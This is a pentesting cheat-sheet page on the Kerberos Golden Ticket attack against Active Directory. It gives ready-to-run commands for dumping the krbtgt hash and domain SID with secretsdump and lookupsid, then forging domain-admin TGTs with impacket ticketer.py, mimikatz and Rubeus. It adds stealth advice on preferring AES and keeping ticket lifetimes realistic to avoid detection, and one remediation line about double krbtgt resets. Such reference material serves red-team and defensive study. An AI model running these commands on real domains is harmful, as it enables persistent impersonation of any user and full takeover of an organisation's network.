**Golden Ticket** — forge a Kerberos TGT with the `krbtgt` account's key. Since every TGT is signed/encrypted with `krbtgt`, a forged one lets you impersonate any user (any groups, including Domain/Enterprise Admins) domain-wide, offline, for as long as the `krbtgt` key is unchanged - the strongest domain persistence primitive.

## Discovery

Not applicable - this is post-compromise. You need the `krbtgt` NT hash **or** AES key plus the domain SID, obtained from [Dump NTDS.dit](../Credential%20Dumping/Dump%20NTDS.dit.md) / [DCSync](../Credential%20Dumping/DCSync.md):

```bash

secretsdump.py 'DOMAIN/USER_NAME:USER_PASS@DC_IP' -just-dc-user 'krbtgt'
lookupsid.py 'DOMAIN/USER_NAME:USER_PASS@DC_IP' | head    # domain SID

```

## Exploitation

### From Linux (impacket)

```bash

ticketer.py -nthash 'KRBTGT_NT_HASH' -domain-sid 'DOMAIN_SID' -domain 'DOMAIN' 'USER_NAME'
# AES is stealthier; -user-id/-groups optional (defaults to 500 / the usual admin groups)
ticketer.py -aesKey 'KRBTGT_AES_KEY' -domain-sid 'DOMAIN_SID' -domain 'DOMAIN' -user-id 500 -groups '512,513,518,519,520' 'USER_NAME'
export KRB5CCNAME='USER_NAME.ccache'

```

### From Windows (mimikatz / Rubeus)

```powershell

# mimikatz
kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_NT_HASH /user:USER_NAME /id:500 /ptt

# Rubeus (/ldap auto-resolves the domain SID)
Rubeus.exe golden /rc4:KRBTGT_NT_HASH /user:USER_NAME /domain:DOMAIN /sid:DOMAIN_SID /ptt /nowrap

```

Then use the ticket - see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

## Caution

- **Only a double `krbtgt` password reset invalidates existing Golden Tickets** (the key keeps the previous value for one rotation). Remediation of a domain compromise requires it.
- Prefer AES over RC4 (RC4 TGTs are anomalous in AES domains). Keep the ticket lifetime realistic - mimikatz defaults to 10 years, a giveaway (event 4769 / long TGT lifetime).
- Stealthier variants keep a legitimate PAC - see [Diamond and Sapphire Tickets](../Kerberos%20Attacks/Diamond%20and%20Sapphire%20Tickets.md). For single-service access without the DC, use a [Silver Ticket](../Kerberos%20Attacks/Silver%20Ticket.md).

## References

- The Hacker Recipes - Golden ticket - https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden
- ired.team - Golden tickets - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets
- GhostPack Rubeus - https://github.com/GhostPack/Rubeus
